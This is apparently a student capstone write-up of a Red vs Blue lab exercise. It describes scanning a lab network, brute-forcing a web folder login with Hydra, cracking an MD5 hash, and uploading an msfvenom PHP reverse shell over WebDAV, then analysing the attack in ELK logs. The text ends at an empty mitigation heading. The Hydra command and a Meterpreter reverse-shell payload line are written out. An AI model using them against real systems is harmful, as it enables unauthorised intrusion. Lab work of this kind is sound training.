# Capstone Engagement #
### Assessment, Analysis, and Hardening of a Vulnerable System ###
#### Author: Exton Howard ####
#### July 15, 2021 ####

## High Level Summary ##

The Red Team is tasked with performing network scans, finding any vulnerabilities that are present and exploitable on the Capstone Apache Web Server, and then exploiting thos vulnerabilities to find a target file on the machine called flag.txt that is located somewhere on the machine.
After the Red Team exploits the machine, the Blue Team is tasked with performing analysis on the logs to determine what the Red Team did and then determine mitigation and hardening strategies for the vulnerabilities exploited by the Red Team.

## Network Topology ##

| IP | Machine |
| :---: | :---: |
| 192.168.1.1 | Hyper-V |
| 192.168.1.90 | Kali |
| 192.168.1.100 | Elastic Stack (ELK) |
| 192.168.1.105 | Capstone |

![ALT](/Network_Topology.png "Network Topology")


## Red Team - Penetration Test ##

Scanned the network using nmap

```
nmap -sS -O -PN 192.168.1.0/24
```

Discovered 4 machines (listed above) and immediately disrgarded 192.168.1.1 as it was the Hyper-V gateway and 192.168.1.90 as it was my attacking Kali Linux machine

Found a machine at 192.168.1.105 which appeared to be a web server and piqued my interest. Ran a second nmap scan at that specific machine top confirm it was the target

```
nmap -sV -O 192.168.1.105
```

![alt text](/screenshots\rt_NMAP.JPG "nmap scan")

Determined this machine is a web server with ports 22 & 80 exposed. Port 22 is running OpenSSH version 7.6p1 and port 80 is running Apache version 2.4.29. Since a webserver is up, Opened a browser and navigated to 192.168.1.105 to see what was there. Found a webserver with a list of directories. Performed cursory research into each directory and found reference to a `/company_folders/secret_folder/` that is not supposed to be exposed to the public. Typed `http://192.168.1.105/company_folders/secret_folder/` to see what I could find. A login screen pops up and states "For Ashton's eyes only". This identifies the most likely admin for the secret folder. No luck. Navigated to `meet_our_team` and read the files about the team, specifically Ashton. Nothing jumped out. Returned to the secret folder.

![alt text](/screenshots\rt_webserver.JPG "Web Server")
![alt text](/screenshots\rt_secret_folder.JPG "Secret Folder Login")

Now to enter the secret folder. Attempted no credentials, no password, and a couple of very basic passwords. Since no credentials were determined, will need to attempt a Brute Force attack using Hydra. Hydra ran with the rockyou.txt wordlist and after a short amount of times, returned ashtons login credentials.

```
hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get /company_folders/secret_folder -t 40
```

![alt text](/screenshots\rt_Hydra.JPG "Ashton's login credentials")

Now to login to the Secret Folder & see what's there. Logging in allowed me to find a file called `connect_to_corp_server` and inside I found directions to a WebDAV server along with a new user name (Ryan) and a password hash. At a glance, the hash appears to be MD5. Ran Hash Identifier to confirm it is MD5. Used crackstation.net to see if it is easily cracked in their database or if more powerful cracking needed to be done. Crackstation.net returned the credentials and confirmed it was an unsalted MD5 hash.

![alt text](/screenshots\rt_secret_file.JPG "connect-to_corp_server")
![alt text](/screenshots\rt-hash-id.JPG/ "Hash-Identifier")
![alt text](/screenshots\rt-crakstation.JPG "crackstation.net")

Followed the directions to gain access to the WebDAV server & logged in with Ryan's credentials. Found a file called password.dav, was unable to get it to open. Found the WebDAV had remote unrestricted upload permissions. Crafted a payload using MSFVenom to create a PHP reverse shell and uploaded into the WebDAV directory.

```
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.90 LPORT=4444 > exploit.php
```

![alt text](/screenshots\rt_webdav_connection.JPG "WebDAV directory")
![alt text](/screenshots\rt_msfvenom_payload_reverse_shell.JPG "MSFVenom Payload)

Uploaded the payload, deployed a listener in Metasploit, then detonated the payload. Gained a Meterpreter session

![alt text](/screenshots\rt_meterpreter_session.JPG "Meterpreter session")

Dropped into a full shell, located the target file, and read out the flag.

![alt text](/screenshots\rt_shell.JPG "Shell")
![alt text](/screenshots\rt_Flag.JPG "Flag")


## Blue Team - Analysis of Attack ##

With the Red Team engagement now complete, the Blue Team used the Elastic Stack (ELK) located at 192.168.1.100 and the beats packages (filebeat, metricbeat, and packetbeat) that were installed on the target machine at 192.168.1.105 to perform analysis of the attack and identify the indicators of attack.

The first indicator of attack was a Port Scan that was conducted on July 1, 2021 at 10:21:10 pm. In the span of less than a second there were 1000 packets recieved and then returned to a machine. Upon further investigation, the destination ports were all different. Additionally, all of the packets came from the same IP address of 192.168.1.90. This is a clear indication that someone is scanning all ports

![alt text](/screenshots\bt_nmap_scan.JPG "nmap scan")

After the port scan, when narrowing the time frame, found someone had accessed `http://192.168.1.105/company_folders/secret_folder`. This is a folder that is not supposed to be accessed. There were 16,412 total packets sent to the secret_folder and most of them had a HTTP response code of 401, which is unautorized. This is a clear indication of a Brute Force attack. The user agent for these attacks was Mozilla/4.0 (Hydra) which is a brute force attack tool. Also found that the file `http://192.168.1.105/company_folders/secret_folder/connect_to_corp_server` was accessed which means that the Brute Force Attack was successful. 

![alt text](/screenshots\bt_secret_folder_access1.JPG "Access of Secret Folder")
![alt text](/screenshots\bt_secret_folder_access2.JPG "Access of Secret Folder")
![alt text](/screenshots\bt_hydra.JPG "Brute Force Attack")

After consulting the file located in the secret folder, determined that the file contained instructions and credentials to the WebDAV directory. Searched and found that someone had accessed the WebDAV directory from IP address 192.168.1.90. Tha attacker uploaded or accessed multiple files in the directory.

![alt text](/screenshots\bt_webdav_visulation.JPG "WebDAV access")
![alt text](/screenshots\bt_webdav_files.jpg "WebDAV files")

Upon further inspection of the files in the WebDAV directory, found one of the files called out and connected to a meterpreter session to give the attacker a shell to continue their attack. At this point, the attacker has significant access to the machine.

![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/bt_Meterpreter_connection1.JPG "TCP shell connection")
![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/bt_Meterpreter_connection2.JPG "TCP shell connection")
![alt text](https://github.com/ExtonHoward/Red_vs_Blue_Project/blob/main/screenshots/bt_Meterpreter_traffic.JPGG "Meterpreter traffic")


## Vulnerabilities & Mitigation ##

